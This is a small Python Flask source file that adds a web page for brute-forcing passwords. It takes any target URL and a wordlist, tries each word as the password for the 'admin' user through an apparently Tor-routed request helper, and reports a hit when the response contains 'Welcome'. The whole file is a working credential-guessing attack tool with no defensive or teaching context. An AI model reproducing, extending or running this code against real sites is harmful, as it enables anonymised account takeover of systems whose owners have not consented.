from flask import Blueprint, request, render_template
import tor_utils

bf_bp = Blueprint('brute', __name__, template_folder='templates')

@bf_bp.route('/brute', methods=['GET', 'POST'])
def brute():
    result = None
    if request.method == 'POST':
        url = request.form.get('url')
        wordlist = request.form.get('wordlist').split()
        for pw in wordlist:
            resp = tor_utils.safe_get(f"{url}", auth=('admin', pw))
            if resp and "Welcome" in resp:
                result = f"Password found: {pw}"
                break
        if not result:
            result = "No password found"
    return render_template('brute.html', result=result)